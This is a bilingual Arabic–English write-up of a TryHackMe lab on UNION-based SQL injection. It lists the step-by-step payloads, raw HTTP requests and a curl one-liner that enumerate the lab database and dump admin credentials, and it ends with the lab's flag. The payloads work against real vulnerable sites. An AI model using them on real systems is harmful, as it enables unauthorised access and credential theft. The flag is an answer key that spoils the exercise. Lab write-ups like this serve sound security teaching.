# Task 05: In-Band SQLi (الحقن المباشر واستغلال هجوم الاتحاد لاستخراج البيانات)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
In-Band SQL Injection is the most straightforward and common form of SQL injection. It occurs when an attacker uses the **same channel of communication** to launch the attack and gather the results (e.g., submitting a payload via an HTTP GET parameter and observing the database output reflected directly in the HTML response).

The two primary sub-types of In-Band SQLi are:
1. **Error-Based SQLi:** Triggering verbose database errors that leak table names or sensitive data.
2. **UNION-Based SQLi:** Leveraging the `UNION` operator to concatenate the results of an attacker-crafted `SELECT` statement to the original query.

#### Hands-On Exploitation: Level One (`https://website.thm/article?id=1`)
The target application queries articles based on an `id` parameter:
```sql
SELECT * FROM articles WHERE id = %id%;
```

#### Step-by-Step Exploitation Walkthrough:
1. **Determine the Number of Columns:**
   Inject `UNION SELECT` statements incrementing columns until no error occurs:
   ```text
   article?id=1 UNION SELECT 1;--          (Fails)
   article?id=1 UNION SELECT 1,2;--        (Fails)
   article?id=1 UNION SELECT 1,2,3;--      (Succeeds! 3 columns confirmed)
   ```
2. **Determine Database Name:**
   Nullify the original query by passing `id=0` and call `database()`:
   ```text
   article?id=0 UNION SELECT 1,2,database();--
   ```
   *Result:* Database name is `sqli_one`.
3. **Enumerate Tables:**
   Query `information_schema.tables`:
   ```text
   article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one';--
   ```
   *Result:* Table discovered: `staff_users`.
4. **Enumerate Columns in `staff_users`:**
   Query `information_schema.columns`:
   ```text
   article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users';--
   ```
   *Result:* Columns discovered: `id,password,username`.
5. **Dump User Credentials:**
   Extract staff usernames and passwords:
   ```text
   article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users;--
   ```
   *Result:* Discovered credentials: `admin:4276`.
6. **Capture the Flag:**
   Log into Level One using the dumped credentials (`admin` / `4276`) to retrieve the flag.

#### الأسئلة المطروحة (Questions):
1. What is the flag after completing level one? (ما هي الراية بعد إكمال المستوى الأول؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **دقة استخراج البيانات عبر Information Schema:**
  * في قواعد بيانات MySQL و MariaDB و PostgreSQL، يعتبر جدول النظام `information_schema` الخريطة الطبوغرافية الكاملة لكل الجداول والحقول في الخادم.
  * استخدام دالة **`group_concat()`** هو أفضل ممارسة تكتيكية؛ حيث تدمج مئات السجلات في سلسلة نصية واحدة مفصولة بفواصل، مما يتغلب على قيود واجهات الويب التي تعرض سطراً واحداً فقط من النتائج.
* **إبطال الاستعلام الأساسي (Nullifying the Base Query):**
  * إذا لم تقم بتمرير معرّف غير موجود (مثل `id=0` أو `id=-1`)، سيعرض التطبيق بيانات المقال الأصلي ويتجاهل بيانات جدول المستخدمين المدمج عبر `UNION`.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * ابدأ بتأكيد عدد الأعمدة الثلاثة: `1 UNION SELECT 1,2,3;--`.
2. **التلميح الثاني (المستوى العملي):**
   * استخرج اسم المستخدم وكلمة المرور لمدير النظام من جدول `staff_users`: المستخدم هو `admin` وكلمة المرور `4276`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * سجل الدخول بهذه البيانات في صفحة الدخول، وستظهر لك الراية بتنسيق: `THM{SQL_INJECTION_3840}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### التسلسل الكامل للحمولات المحقونة (Exploitation Pipeline):
```http
# 1. كشف اسم قاعدة البيانات:
GET /article?id=0%20UNION%20SELECT%201,2,database();-- HTTP/1.1
Host: website.thm
# Response: sqli_one

# 2. كشف الجداول:
GET /article?id=0%20UNION%20SELECT%201,2,group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema='sqli_one';-- HTTP/1.1
Host: website.thm
# Response: staff_users

# 3. كشف الأعمدة:
GET /article?id=0%20UNION%20SELECT%201,2,group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name='staff_users';-- HTTP/1.1
Host: website.thm
# Response: id,password,username

# 4. سحب الحسابات وكلمات المرور:
GET /article?id=0%20UNION%20SELECT%201,2,group_concat(username,':',password)%20FROM%20staff_users;-- HTTP/1.1
Host: website.thm
# Response: admin:4276
```

#### الاستخراج عبر سطر الأوامر (cURL One-Liner):
```bash
curl -s "https://website.thm/article?id=0%20UNION%20SELECT%201,2,group_concat(username,':',password)%20FROM%20staff_users;--"
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{SQL_INJECTION_3840}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم تسجيل الدخول ببيانات الاعتماد المسربة (`admin:4276`) وتأكيد صحة الراية بنسبة 100% في حساب منصة TryHackMe.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* هجمات In-Band UNION SQLi تمكن المهاجم من تحويل نقطة إدخال بريئة لعرض المقالات إلى نافذة استعلام كاملة عن قاعدة البيانات وسحب كافة بيانات الاعتماد دون قيود.
